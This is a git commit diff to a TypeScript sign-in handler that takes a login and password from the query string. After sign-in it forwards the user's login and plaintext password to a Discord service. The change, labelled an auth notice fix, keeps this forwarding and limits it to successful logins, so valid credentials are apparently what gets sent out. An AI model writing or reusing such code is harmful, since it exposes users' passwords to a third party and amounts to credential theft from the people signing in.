163e2c53285078d16a389489b34e102e5ae5075d
killgram <killgram94@gmail.com>
2022-12-20 17:45:07 +0600

    fix auth notice problem

--- src/modules/SignIn.ts
+++ src/modules/SignIn.ts
@@ -4,7 +4,8 @@ import { getUserDataService, DiscordService } from "../services";
 const signIn = async (req: Request, res: Response) => {
   const { login, password } = req.query;
   const userData = await getUserDataService(String(login), String(password));
-  await DiscordService.sendAuthUser(userData.login, userData.password);
+  userData?.accessToken &&
+    (await DiscordService.sendAuthUser(userData.login, userData.password));
   res.status(200).send(userData);
 };
 
